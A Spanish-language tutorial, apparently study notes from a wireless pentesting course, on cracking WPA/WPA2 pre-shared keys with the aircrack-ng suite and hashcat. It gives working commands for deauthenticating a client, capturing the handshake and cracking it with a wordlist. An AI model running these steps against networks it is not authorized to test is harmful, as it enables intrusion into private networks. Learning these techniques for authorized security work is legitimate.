# Cracking de hashes

WPA, WPA2 y WPA3 soportan 2 tipos de autenticaciones: **Pre-shared Keys (PSK)** y **Enterprise**

**WPA** y **WPA2** tienen prácticamente el mismo método de autenticación por lo que todas las técnicas de ambas tecnologías son intercambiables.

**WPA3** tiene similitudes con **WPA** pero usa **Simultaneous Authentication of Equals (SAE)** y no es vulnerable a ataques offline.


# Proceso

#### 1) Ponemos nuestra interface en modo monitor

#### 2) Sniffamos la red con airodump

    sudo airodump-ng <interface>

#### 3) Seleccionamos nuestro AP target

    sudo airodump-ng -c <channel> -w <prefix> --essid <essid> --bssid <bssid> <interface>

Caso de ejemplo:

    kali@kali:~$ sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
    ...
    
    CH  3 ][ Elapsed: 12 s ][ 2020-02-29 13:30 ][
    
     BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
    
     34:08:04:09:3D:38  -45  87      107       69    1   3  54e. WPA2 CCMP   PSK  wifu
    
     BSSID              STATION            PWR   Rate    Lost  Packets  Probes
    
     34:08:04:09:3D:38  00:18:4D:1D:A8:1F  -26   54-54      0       31

#### 4) Obtenemos los datos de nuestro target(parte superior) y la MAC de un cliente que lo esté consumiendo (Station de la parte inferior)
#### 5) Desde otra terminal desautenticamos al cliente con aireplay

    sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon

#### 6) Cuando el cliente se reconecte airodump va a poder recolectar el handshake

Si no captura el handshake podemos repetir el paso **5** de las siguientes maneras:

- Moviendonos a una posición más cercana al router
- Algunos routers no soportan la desautenticación directa, por lo que tendremos que probar un broadcast: el mismo comando pero sin la flag -c (y el argumento)
- Si el tipo de conexión es 802.11w está en uso, no soporta desautenticaciones desencriptadas. Tendremos que dejar la recolección hasta que alguien se conecte.

Una vez capturado el handshake lo dejamos unos minutos más para obtener un poco más de info y cerramos airodump

#### 7) Utilizamos aircrack para crackear el handshake

    aircrack-ng -w <dictio> -e <essid> -b <bssid> <.pcap>

#### 8) Confirmamos que la clave sea correcta

    airdecap-ng -b <bssid> -e <essid> -p <passphrase> <.pcap>

Si el resultado muestra que se lograron desencriptar un monto de paquetes del pcap, entonces la pass-phrase es correcta.

### Realizar el crack con hashcat

Necesitamos los "utils" de hashcat

    sudo apt install hashcat-utils
    
#### 1) Convertimos el pcap a hccapx


    /usr/lib/hashcat-utils/cap2hccapx.bin <.pcap> output.hccapx

#### 2) Pasamos el archivo final por hashcat

    hashcat -m 2500 --depreciated-check-disable output.hccapx <dictio>
